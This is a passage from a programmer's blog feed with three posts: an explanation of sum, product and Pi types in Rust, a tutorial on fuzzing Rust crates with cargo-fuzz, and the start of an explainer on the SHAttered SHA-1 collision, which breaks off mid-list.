<h2>Why do we call it a sum type?</h2>

<p><em>Here be (type theory) <a href="https://en.wikipedia.org/wiki/Compilers:_Principles,_Techniques,_and_Tools">dragons</a></em></p>

<p>Let&rsquo;s step back a bit and figure out what a type is.</p>

<p>It&rsquo;s really a restriction on the values allowed. It can have things like methods and whatnot
dangling off it, but that&rsquo;s not so important here.</p>

<p>In other words, it&rsquo;s like<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> a <a href="https://en.wikipedia.org/wiki/Set_(mathematics)">set</a>. A boolean is the set \(\{\mathtt{true}, \mathtt{false}\}\). An 8-bit unsigned integer
(<code>u8</code> in Rust) is the set \(\{0, 1, 2, 3, &hellip;. 254, 255\}\). A string is a set with
infinite elements, containing all possible valid strings<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>.</p>

<p>What&rsquo;s a struct? A struct with two fields contains every possible combination of elements from the two sets.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="kt">bool</span><span class="p">,</span>
</span><span class='line'>    <span class="n">y</span><span class="o">:</span> <span class="kt">u8</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The set of possible values of <code>Foo</code> is</p>

&#92;[&#92;{(\mathtt{x}, \mathtt{y}): \mathtt{x} \in \mathtt{bool}, \mathtt y \in \mathtt{u8}&#92;}&#92;]


<p>(Read as &ldquo;The set of all \((\mathtt{x}, \mathtt{y})\) where \(\tt x\) is in \(\mathtt{bool}\) and \(\tt y\) is in \(\mathtt{u8}\)&rdquo;)</p>

<p>This is called a <em>Cartesian product</em>, and is often represented as \(\tt Foo = bool \times u8\).
An easy way to view this as a product is to count the possible values: The number of possible values
of <code>Foo</code> is the number of possible values of <code>bool</code> (2) <em>times</em> the number of possible values of <code>u8</code> (256).</p>

<p>A general struct would be a &ldquo;product&rdquo; of the types of each field, so something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="kt">bool</span><span class="p">,</span>
</span><span class='line'>    <span class="n">y</span><span class="o">:</span> <span class="kt">u8</span><span class="p">,</span>
</span><span class='line'>    <span class="n">z</span><span class="o">:</span> <span class="kt">bool</span><span class="p">,</span>
</span><span class='line'>    <span class="n">w</span><span class="o">:</span> <span class="n">String</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>is \(\mathtt{Bar = bool \times u8 \times bool \times String}\)</p>

<p>This is why structs are called &ldquo;product types&rdquo;<sup id="fnref:6"><a href="#fn:6" rel="footnote">6</a></sup>.</p>

<p>You can probably guess what comes next &ndash; Rust/Swift enums are &ldquo;sum types&rdquo;, because they are the
<em>sum</em> of the two sets.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">enum</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">Bool</span><span class="p">(</span><span class="kt">bool</span><span class="p">),</span>
</span><span class='line'>    <span class="nb">Integer</span><span class="p">(</span><span class="kt">u8</span><span class="p">),</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>is a set of all values which are valid booleans, <em>and</em> all values which are valid integers. This
is a sum of sets, \(\tt Foo = bool + u8\). More accurately, it&rsquo;s a <em>disjoint union</em>, where if the input
sets have overlap, the overlap is &ldquo;discriminated&rdquo; out.</p>

<p>An example of this being a disjoint union is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">enum</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Bool1</span><span class="p">(</span><span class="kt">bool</span><span class="p">),</span>
</span><span class='line'>    <span class="n">Bool2</span><span class="p">(</span><span class="kt">bool</span><span class="p">),</span>
</span><span class='line'>    <span class="nb">Integer</span><span class="p">(</span><span class="kt">u8</span><span class="p">).</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is not \(\tt Bar = bool + bool + u8\), because \(\tt bool + bool = bool\), (regular set addition doesn&rsquo;t duplicate the overlap).</p>

<p>Instead, it&rsquo;s something like</p>

&#92;[\tt Bar = bool + otherbool + u8&#92;]


<p>where \(\tt otherbool\) is also a set \(\tt \{true, false\}\),
except that these elements are <em>different</em> from those in \(\tt bool\). You can look at it as if</p>

&#92;[\tt otherbool = &#92;{true_2, false_2&#92;}&#92;]


<p>so that</p>

&#92;[\mathtt{bool + otherbool} = &#92;{\mathtt{true, false, true_2, false_2}&#92;}&#92;]


<p>For sum types, the number of possible values is the sum of the number of possible values of
each of its component types.</p>

<p>So, Rust/Swift enums are &ldquo;sum types&rdquo;.</p>

<p>You may often notice the terminology &ldquo;algebraic datatypes&rdquo; (ADT) being used, usually that&rsquo;s just
talking about sum and product types together &ndash; a language with ADTs will have both.</p>

<p>In fact, you can even have <em>exponential</em> types! The notation A<sup>B</sup> in set theory does mean something,
it&rsquo;s the set of all possible mappings from \(B\) to \(A\). The number of elements is \(N_A^{N_B}\). So
basically, the type of a function (which is a mapping) is an &ldquo;exponential&rdquo; type. You can also view it as
an iterated product type, a function from type <code>B</code> to <code>A</code> is really a struct like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// the type</span>
</span><span class='line'><span class="k">fn</span> <span class="n">my_func</span><span class="p">(</span><span class="n">b</span><span class="o">:</span> <span class="n">B</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">A</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// is conceptually (each possible my_func can be written as an instance of)</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">my_func</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">b1</span><span class="o">:</span> <span class="n">A</span><span class="p">,</span> <span class="c1">// value for first element in B</span>
</span><span class='line'>    <span class="n">b2</span><span class="o">:</span> <span class="n">A</span><span class="p">,</span> <span class="c1">// value for second element in B</span>
</span><span class='line'>    <span class="n">b3</span><span class="o">:</span> <span class="n">A</span><span class="p">,</span>
</span><span class='line'>    <span class="c1">// ... </span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>given a value of the input <code>b</code>, the function will find the right field of <code>my_func</code> and return
the mapping. Since a struct is a product type, this is</p>

&#92;[\mathtt{A}^{N_\mathtt{B}} = \tt A \times A \times A \times \dots&#92;]


<p>making it an exponential type.</p>

<p><a href="http://strictlypositive.org/diff.pdf">You can even take <em>derivatives</em> of types!</a> (h/t Sam Tobin-Hochstadt for pointing this out to me)</p>

<h2>What, in the name of sanity, is a Pi type?</h2>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/memes/what-in-the-name-of-sanity.jpg" width="400"></p>

<p>It&rsquo;s essentially a form of dependent type. A dependent type is when your type
can depend on a value. An example of this is integer generics, where you
can do things like <code>Array&lt;bool, 5&gt;</code>, or <code>template&lt;unsigned int N, typename T&gt; Array&lt;T, N&gt; ...</code> (in C++).</p>

<p>Note that the type signature contains a <em>type</em> dependent on an integer, being generic over multiple
different array lengths.</p>

<p>The name comes from how a constructor for these types would look:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// create an array of booleans from a given integer</span>
</span><span class='line'><span class="c1">// I made up this syntax, this is _not_ from the Rust Pi type RFC</span>
</span><span class='line'><span class="k">fn</span> <span class="n">make_array</span><span class="p">(</span><span class="n">x</span><span class="o">:</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="n">x</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// or</span>
</span><span class='line'><span class="c1">// (the proposed rust syntax)</span>
</span><span class='line'><span class="k">fn</span> <span class="n">make_array</span><span class="o">&lt;</span><span class="kr">const</span> <span class="n">x</span><span class="o">:</span> <span class="kt">u8</span><span class="o">&gt;</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="n">x</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>   <span class="c1">// ... </span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>What&rsquo;s the type of <code>make_array</code> here? It&rsquo;s a function which can accept any integer
and return a different type in each case. You can view it as a set of functions,
where each function corresponds to a different integer input. It&rsquo;s basically:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">make_array</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">make_array_0</span><span class="o">:</span> <span class="k">fn</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">make_array_1</span><span class="o">:</span> <span class="k">fn</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="mi">1</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">make_array_2</span><span class="o">:</span> <span class="k">fn</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="mi">2</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">make_array_3</span><span class="o">:</span> <span class="k">fn</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="mi">3</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">make_array_4</span><span class="o">:</span> <span class="k">fn</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="mi">4</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">make_array_5</span><span class="o">:</span> <span class="k">fn</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Array</span><span class="o">&lt;</span><span class="kt">bool</span><span class="p">,</span> <span class="mi">5</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'>    <span class="c1">// ... </span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Given an input, the function chooses the right child function here, and calls it.</p>

<p>This is a struct, or a product type! But it&rsquo;s a product of an infinite number of types<sup id="fnref:7"><a href="#fn:7" rel="footnote">7</a></sup>.</p>

<p>We can look at it as</p>

&#92;[&#92;texttt{make_array} = \prod\limits_{x = 0}^\infty\left( \texttt{fn()} \mathtt\to \texttt{Array&lt;bool, x&gt;}\right)&#92;]


<p>The usage of the \(\Pi\) symbol to denote an iterative product gives this the name &ldquo;Pi type&rdquo;.</p>

<p>In languages with lazy evaluation (like Haskell), there is no difference between having a function
that can give you a value, and actually having the value. So, the type of <code>make_array</code> is the type
of <code>Array&lt;bool, N&gt;</code> itself in languages with lazy evaluation.</p>

<p>There&rsquo;s also a notion of a &ldquo;sigma&rdquo; type, which is basically</p>

&#92;[\sum\limits_{x = 0}^\infty \left(\texttt{fn()} \mathtt\to \texttt{Array&lt;bool, x&gt;}\right)&#92;]


<p>With the Pi type, we had &ldquo;for all N we can
construct an array&rdquo;, with the sigma type we have &ldquo;there exists some N for which we can construct this array&rdquo;.
As you can expect, this type can be expressed with a possibly-infinite enum, and instances of this type
are basically instances of <code>Array&lt;bool, N&gt;</code> for some specific <code>N</code> where the <code>N</code> is only known at runtime.
(much like how regular sum types are instances of one amongst multiple types, where the exact type
is only known at runtime). <code>Vec&lt;bool&gt;</code> is conceptually similar to the sigma type <code>Array&lt;bool, ?&gt;</code>,
as is <code>&amp;[bool]</code>.</p>

<h2>Wrapping up</h2>

<p>Types are sets, and we can do set-theory things on them to make cooler types.</p>

<p>Let&rsquo;s try to avoid using confusing terminology, however. If Rust <em>does</em> get &ldquo;pi types&rdquo;,
let&rsquo;s just call them &ldquo;dependent types&rdquo; or &ldquo;const generics&rdquo; :)</p>

<p><em>Thanks to Zaki, Avi Weinstock, Corey Richardson, and Peter Atashian for reviewing drafts of this post.</em></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Rust, Swift, <em>sort of</em> Typescript, and all the functional languages who had it before it was cool.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>Lookin&#8217; at you, Go.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Moooooooooooooooonads<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Types are not exactly sets due to some differences, but for the purposes of this post we can think of them like sets.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Though you can argue that strings often have their length bounded by the pointer size of the platform, so it&rsquo;s still a finite set.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>This even holds for zero-sized types, for more examples, check out <a href="http://chris-taylor.github.io/blog/2013/02/10/the-algebra-of-algebraic-data-types/">this blog post</a><a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
<li id="fn:7">
<p>Like with strings, in practice this would probably be bounded by the integer type chosen<a href="#fnref:7" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mitigating Underhandedness: Fuzzing Your Code]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/03/02/mitigating-underhandedness-fuzzing-your-code/"/>
    <updated>2017-03-02T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/03/02/mitigating-underhandedness-fuzzing-your-code</id>
    <content type="html"><![CDATA[<p><em>This may be part of a collaborative blog post series about underhanded Rust code. Or it may not. I invite you to write your own posts about underhanded code to make it so!</em></p>

<p>The <a href="https://underhanded.rs/blog/2017/02/28/extending-submission-deadline.en-US.html">submission deadline for the Underhanded Rust competition has been extended</a>, so
let&rsquo;s talk more about how to keep your code working and free from bugs/underhandedness!</p>

<p><a href="http://manishearth.github.io/blog/2017/01/21/mitigating-underhandedness-clippy/">Previously, we talked about Clippy</a>.</p>

<p>Now, really, underhanded bugs are just another form of bug. And how do we find bugs? We test!</p>

<p>We write unit tests. We run the code under Valgrind, ASan, MSan, UBSan, TSan, and any other sanitizer
we can get our hands on. Tests tests tests. More tests. Tests.</p>

<p>But, there&rsquo;s a problem here. You need to write <em>test cases</em> to make this work. These are inputs
fed to your code after which you check whatever invariants your code has. There&rsquo;s
no guarantee that the test cases you write will exercise all the code paths in your
program. This applies for sanitizers too, sanitizers are limited to testing the code paths
that your test cases hit.</p>

<p>Of course, you can use code coverage tools to ensure that all these code paths will be hit.
However, there&rsquo;s a conflict here &ndash; your code will have many code paths that are
<em>not supposed to be hit ever</em>. Things like redundant bounds checks, null checks, etc.
In Rust programs such code paths generally use panics.</p>

<p>Now, these code paths are never <em>supposed</em> to be hit, so they&rsquo;ll never show up in your
code coverage. But you don&rsquo;t have a guarantee that they can never be hit, short
of formally verifying your program. The only solution here is writing more test cases.</p>

<p>Aside from that, even ignoring those code paths, you still need to manually write
test cases for everything. For each possible code path in your code, if you want to
be sure.</p>

<p>Who wants to manually write a million test cases?</p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/memes/aint-nobody.jpg" width="400"></p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/memes/that-would-be-great.jpg" width="400"></p>

<p>Enter fuzzing. What fuzzing will do is feed your program random inputs, carefully watching the
codepaths being taken, and try to massage the inputs so that new, interesting (usually crashy)
codepaths are taken. You write tests for the fuzzer such that they can accept arbitrary input, and
the fuzzer will find cases where they crash or panic.</p>

<p>One of the most popular fuzzers out there is <a href="http://lcamtuf.coredump.cx/afl/">AFL</a>, which takes a binary and feeds it random
input. Rust <a href="https://github.com/rust-fuzz/afl.rs">has a library that you can use for running AFL</a>, however it currently needs
to be run via a Docker image or needs a recompilation of rustc, since it adds a custom LLVM pass.
We&rsquo;re working on making this step unnecessary.</p>

<p>However, as of a few weeks ago, we now have bindings for <a href="http://llvm.org/docs/LibFuzzer.html">libFuzzer</a>, which uses existing
instrumentation options built in to LLVM itself! libFuzzer works a bit differently; instead
of giving it a binary, you write a function in a special way and give it a library containing
that function, which it turns into a fuzzer binary. This is faster, since the fuzzer lives
inside the binary itself and it doesn&rsquo;t need to execute a new program each time.</p>

<p>Using libFuzzer in Rust is easy. Install <a href="https://github.com/rust-fuzz/cargo-fuzz"><code>cargo-fuzz</code></a>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>cargo install cargo-fuzz
</span></code></pre></td></tr></table></div></figure>


<p>Now, within your crate, initialize the fuzz setup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>cargo fuzz init
</span></code></pre></td></tr></table></div></figure>


<p>This will create a fuzzing crate in <code>fuzz/</code>, with a single &ldquo;fuzz target&rdquo;, <code>fuzzer_script_1</code>.
You can add more such targets with <code>cargo fuzz add name_of_target</code>. Fuzz targets are small libraries
with a single function in them; the function that will be called over and over again by the fuzzer.
It is up to you to fill in the body of this function, such that the program will crash or panic
if and only if something goes wrong.</p>

<p>For example, for the <code>unicode-segmentation</code> crate, <a href="https://github.com/Manishearth/unicode-segmentation/blob/99b3636ef6b4d96c05644403c1c2eccba2c5f5db/fuzz/fuzzers/equality.rs">one of the fuzz targets I wrote</a> just
takes the string, splits it by grapheme and word boundaries, recombines it, and then asserts that
the new string is the same.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">extern</span> <span class="k">fn</span> <span class="n">go</span><span class="p">(</span><span class="n">data</span><span class="o">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="kt">u8</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// we only deal with unicode input</span>
</span><span class='line'>    <span class="c1">// bail early, *without panicking* if the input isn&#39;t utf8</span>
</span><span class='line'>    <span class="k">if</span> <span class="kd">let</span> <span class="nb">Ok</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">=</span> <span class="kt">str</span><span class="o">::</span><span class="n">from_utf8</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// split into graphemes, recollect</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">result</span> <span class="o">=</span> <span class="n">UnicodeSegmentation</span><span class="o">::</span><span class="n">graphemes</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="k">true</span><span class="p">).</span><span class="n">flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="n">s</span><span class="p">.</span><span class="n">chars</span><span class="p">()).</span><span class="n">collect</span><span class="o">::&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">();</span>
</span><span class='line'>        <span class="c1">// recollected string should be the same as the input, panic if not</span>
</span><span class='line'>        <span class="n">assert_eq</span><span class="o">!</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// split into words, recollect</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">split_word_bounds</span><span class="p">().</span><span class="n">flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">s</span><span class="o">|</span> <span class="n">s</span><span class="p">.</span><span class="n">chars</span><span class="p">()).</span><span class="n">collect</span><span class="o">::&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">();</span>
</span><span class='line'>        <span class="c1">// recollected string should be the same as the input, panic if not</span>
</span><span class='line'>        <span class="n">assert_eq</span><span class="o">!</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The other targets ensure that the forward and reverse word/grapheme
iterators produce the same results. They all take the byte slice input, attempt to convert to UTF8
(silently failing  &ndash; NOT panicking &ndash; if not possible), and then use the string as an input
testcase.</p>

<p>Now, these targets will panic if the test fails, and the fuzzer will try and force that panic to
happen. But also, these targets put together exercise most of the API surface of the crate, so
the fuzzer may also find panics (or even segmentation faults!) in the crate itself. For example,
the <a href="https://github.com/servo/rust-url/blob/3e5541e51e02d8acb10a6ea8ab174ba1bc23ce41/fuzz/fuzzers/parse.rs#L10">fuzz target for rust-url</a> doesn&rsquo;t itself assert; all it does is try to parse the given
string. The fuzzer will try to get the URL parser to panic.</p>

<p>To run a fuzz script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>cargo fuzz run fuzzer_script_1
</span></code></pre></td></tr></table></div></figure>


<p>This will start the fuzzer, running until it finds a crash or panic. It may also
find other things like inputs which make the code abnormally slow.</p>

<p>Fuzzing can find some interesting bugs. For example, the unicode-segmentation
fuzzers found <a href="https://github.com/unicode-rs/unicode-segmentation/issues/19">this bug</a>, where an emoji followed by <em>two</em> skin tone modifiers
isn&rsquo;t handled correctly. We&rsquo;d probably never have been able to come up with this testcase on our
own. But the fuzzer could find it!</p>

<p>The Rust Cap&#8217;n Proto crate ran cargo-fuzz and found <a href="https://dwrensha.github.io/capnproto-rust/2017/02/27/cargo-fuzz.html">a whole ton of bugs</a>. There
are more such examples <a href="https://github.com/rust-fuzz/cargo-fuzz#trophy-case">in the trophy case</a> (be sure to add any of your own findings
to the trophy case, too!)</p>

<p>cargo-fuzz is relatively new, so the API and behavior may still be tweaked a bit before 1.0.
But you can start taking it for a spin now, and finding bugs!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Clarifying Misconceptions About SHAttered]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/02/26/clarifying-misconceptions-about-shattered/"/>
    <updated>2017-02-26T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/02/26/clarifying-misconceptions-about-shattered</id>
    <content type="html"><![CDATA[<p>This week Google published a <a href="https://shattered.io/">SHA-1 collision</a>.</p>

<p>There&rsquo;s a lot of confusion about the implications of this. A lot of this is due to differences of
opinion on what exactly constitutes a &ldquo;new&rdquo; collision. I <a href="https://twitter.com/ManishEarth/status/835557328308969472">tweeted about this</a>. The webpage
for the attack itself is misleading, saying that the answer to &ldquo;Who is capable of mounting this attack?&rdquo;
is people with Google-esque resources. This depends on what exactly you mean by &ldquo;this attack&rdquo;.</p>

<p>So I&rsquo;m seeing a lot of &ldquo;oh well just another anti-milestone for SHA, doesn&rsquo;t affect anyone since its
still quite expensive to exploit&rdquo; reactions, as well as the opposite &ldquo;aaaaa everything is on fire&rdquo;
reaction. Both are wrong. It has practical implications for you even if you are certain that you
won&rsquo;t attract the ire of an entity with a lot of computational power. None of these implications,
however, are likely to be disastrous.</p>

<p>TLDR: Now <em>anyone</em>, without needing Google-esque resources,
can generate two colliding PDFs with arbitrary visual content in each.</p>

<p>(In fact, there&rsquo;s already <a href="http://alf.nu/SHA1">a PDF collision-generator</a> up where
you can upload two images and get a PDF with collisions in it)</p>

<h2>Okay, back up a bit. What&rsquo;s a hash? What&rsquo;s SHA-1?</h2>

<p>I explained this a bit in my older post about <a href="http://manishearth.github.io/blog/2016/03/05/exploring-zero-knowledge-proofs/">zero-knowledge-proofs</a>.</p>

<p>In essence, a hash function takes some data (usually of arbitrary size), and produces a value called
a <em>hash</em> (usually of fixed size). The function has some additional properties:</p>

<ul>
<li>In almost all cases, a small perturbation in the input will lead to a large perturbation in the hash</li>
<li>Given an input and its hash, it is computationally hard to find an alternate input producing the same hash</li>
<li>It&rsquo;s also hard to just find two inputs that has to the same value, though this is usually easier than the previous one</li>
</ul>


<p>when two inputs hash to the same value, this is called a collision. As mentioned, is easier to find
<em>a</em> collision, over finding a colliding alternate input for a known input.</p>

<p>SHA-1 is one such hash function. It&rsquo;s been known for a while that it&rsquo;s insecure, and the industry has
largely moved off of it, but it&rsquo;s still used,</p>

<h2>What did the researchers do?</h2>

<p>They found a hash collision for SHA-1. In essence, they found two strings, <code>A</code> and <code>B</code>, where
<code>SHA1(A) == SHA1(B)</code>.</p>

<p><em>However</em>, given the way SHA-1 works, this means that you can generate infinitely many other
such pairs of strings. And given the nature of the exact <code>A</code> and <code>B</code> they created, it is possible
to use this to create arbitrary colliding PDFs.</p>

<p>Basically, SHA-1 (and many other hash functions), operate on &ldquo;blocks&rdquo;. These are fixed-size chunks
of data, where the size is a property of the hash function. For SHA1 this is 512 bits.</p>

<p>The function starts off with an &ldquo;initial&rdquo; built-in hash. It takes the first block of your data and
this hash, and does some computation with the two to produce a new hash, which is its state after
the first block.</p>

<p>It will then take this hash and the second block, and run the same computations to produce
a newer hash, which is its state after the second block. This is repeated till all blocks have
been processed, and the final state is the result of the function.</p>

<p>There&rsquo;s an important thing to notice here. At each block, the only inputs are the block itself and the
hash of the string up to that block.</p>

<p>This means, if <code>A</code> and <code>B</code> are of a size that is a multiple of the block size, and <code>SHA1(A) == SHA1(B)</code>,
then <code>SHA1(A + C) == SHA1(B + C)</code>. This is because, when the hash function reaches <code>C</code>, the state will
be the same due to the hash collision, and after this point the next input blocks are identical in
both cases, so the final hash will be the same.</p>

<p>Now, while you might consider <code>A+C, B+C</code> to be the &ldquo;same collision&rdquo; as <code>A, B</code>, the implications
of this are different than just &ldquo;there is now one known pair of inputs that collide&rdquo;, since everyone
now has the ability to generate new colliding inputs by appending an arbitrary string to <code>A</code> and <code>B</code>.</p>

<p>Of course, these new collisions have the restriction that the strings will always start with <code>A</code> or
<code>B</code> and the suffixes will be identical. If you want to break this restriction, you will
have to devote expensive resources to finding a new collision, like Google did.</p>

<h2>How does this let us generate arbitrary colliding PDFs?</h2>

<p>So this exploit actually uses features of the JPEG format to work. It was done in
a PDF format since JPEGs often get compressed when sent around the Internet. However,
since both A and B start a partial PDF document, they can only be used to generate colliding
PDFs, not JPEGs.</p>

<p>I&rsquo;m going to first sketch out a simplified example of what this is doing, using a hypothetical
pseudocode-y file format. The researchers found a collision between the strings:</p>

<ul>
